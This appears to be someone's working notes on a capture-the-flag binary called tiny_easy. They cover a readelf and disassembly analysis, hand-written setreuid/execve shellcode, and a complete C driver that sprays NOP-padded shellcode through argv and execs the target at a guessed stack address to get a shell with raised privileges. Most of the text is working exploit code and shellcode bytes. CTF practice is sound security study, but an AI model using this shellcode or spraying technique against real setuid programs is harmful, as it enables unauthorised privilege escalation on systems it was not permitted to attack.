readelf -h tiny_easy
    after loading, entry at 0x08048054
    header is 52 bytes
    single program header starts at byte 52 (0x34), ends at byte 84 (0x54)
    -> this lines up with program entry point: the actual code is in bytes [84:]
    
pop eax
pop edx
mov edx, dword ptr [edx]
call edx

2nd item on the stack when program is loaded ends up in edx: call (*edx)()

-> idea: program is not linked against anything useful (or anything at all really), so we can't jump to something pre-existing
but we could inject shellcode as an argument and maybe jump to that
the 2nd item on the stack is the 'program_filename': can we change environment s.t. this program filename contains a jump to our injected shellcode (on the stack)?
    -> note stack is rwx, but still randomized location on program load

--- piece 1: shellcode

shellcode: setreuid(getegid(), getegid()); execve(argv[0], NULL, NULL);

   0:   6a 32                   push   0x32
   2:   58                      pop    rax          ; getegid, no mov (requires null byte)
   3:   0f 05                   syscall
   5:   89 c3                   mov    ebx,eax      ; setreuid arg1
   7:   89 c1                   mov    ecx,eax      ; setreuid arg0
   9:   6a 46                   push   0x46         ; setreuid, no mov (requires null byte)
   b:   58                      pop    rax
   c:   0f 05                   syscall
   e:   8d 1c 24                lea    ebx,[rsp]    ; execve arg0 (pointer to argv[0])
  11:   31 c9                   xor    ecx,ecx      ; execve arg1
  13:   31 d2                   xor    edx,edx      ; execve arg2
  15:   0f 05                   syscall

--- piece 2: inject custom "program_filename" onto stack
running with a custom environment: env -i TEST="TEST" bash -l -c "gdb tiny_easy"
    - not necessary though, can just pass payload through argv
running from a symlink DOES use the symlink's name
    maybe run a program which creates a virtual file symlinked to tiny_easy, and give virtual file name=payload?
    https://www.man7.org/linux/man-pages/man2/symlink.2.html
        - nope -- could create a symlink in /tmp directory with arbitrary name, but it will still have "/tmp" at the start
+++ overthinking it: execve() will do the trick just fine. argv[0] by CONVENTION is the filename, but we can just specify our own
    int main() {
        char* args[] = {"jmp_addr", "shellcode", NULL};
        execve("/home/tiny_easy/tiny_easy", args, NULL);
    }

--- piece 3: identifying location of shellcode on stack
... maybe since we're calling execve(), stack will remain in the location it is in our driver program?
compile driver for x86: -m32
disable relro: -Wl,-z,relro,-z,now
disable stack canaries: -fno-stack-protector
disable pie: -no-pie
gcc -m32 -fno-stack-protector -no-pie -Wl,-z,relro,-z,now te.c
    no: stack location always randomizes, not terribly surprising
    
"heap spraying": modify payload to include many, many copies of the shellcode, with massive NOP paddings

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define N_COPIES 512
#define PACKAGE_SIZE 4096
int main() {
        int i, j, k, ec;
        char* args[N_COPIES];
        char* env[2];
        const char strpayload[] = "/bin/sh";
        const char shellcode[] = "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x6a\x0b\x58\x8b\x5c\x24\x04\x31\xc9\x31\xd2\xcd\x80";        const char guess_addr[] = "\xc4\xa7\xac\xff";

        env[0] = "ENV=ENV";
        env[1] = NULL;

        printf("sizeof(shellcode) = %u | sizeof(guess_addr) = %u\n", sizeof(shellcode), sizeof(guess_addr));

        // argv[0]: jump address
        args[0] = (char*)(malloc(PACKAGE_SIZE));
        for (i = 0; i < sizeof(guess_addr); i++) args[0][i] = guess_addr[i];
        for (; i < PACKAGE_SIZE; i++) args[0][i] = '\x90';
        args[0][i] = '\x00';

        // argv[1]: string payload
        args[1] = (char*)(malloc(sizeof(strpayload)));
        for (i = 0; i < sizeof(strpayload); i++) args[1][i] = strpayload[i];

        // argv[2]: null string
        args[2] = (char*)(malloc(64));
        for (i = 0; i < 64; i++) args[2][i] = '\x00';

        // argv[3:N_COPIES - 2]: pass a package (NOPs + shellcode)
        for (i = 3; i < N_COPIES - 1; i++) {
                args[i] = (char*)(malloc(PACKAGE_SIZE));
                for (j = 0; j < (PACKAGE_SIZE - sizeof(shellcode)); j++) args[i][j] = '\x90';  // x86 NOP
                for (k = 0; k < sizeof(shellcode); j++, k++) args[i][j] = shellcode[k];
        }

        // argv[N_COPIES - 1]: nullptr
        args[i] = NULL;

        /*
           printf("args[1] = ... \n");
           for (i = 0; i < PACKAGE_SIZE; i += 32) {
           printf("0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx 0x%02hhx%02hhx%02hhx%02hhx\n", args[1][i], args[1][i+1], args[1][i+2], args[1][i+3], args[1][i+4], args[1][i+5], args[1][i+6], args[1][i+7], args[1][i+8], args[1][i+9], args[1][i+10], args[1][i+11], args[1][i+12], args[1][i+13], args[1][i+14], args[1][i+15], args[1][i+16], args[1][i+17], args[1][i+18], args[1][i+19], args[1][i+20], args[1][i+21], args[1][i+22], args[1][i+23], args[1][i+24], args[1][i+25], args[1][i+26], args[1][i+27], args[1][i+28], args[1][i+29], args[1][i+30], args[1][i+31]);
           }
           */

        ec = execve("/home/tiny_easy/tiny_easy", args, env);
        if (ec) perror("execve error: ");
        return 0;
}
    
https://lwn.net/Articles/630727/

some addresses where arg strings ended up:
ffcca7c4
ff85b7c4
ff9d27c4
ffb757c4
ffee27c4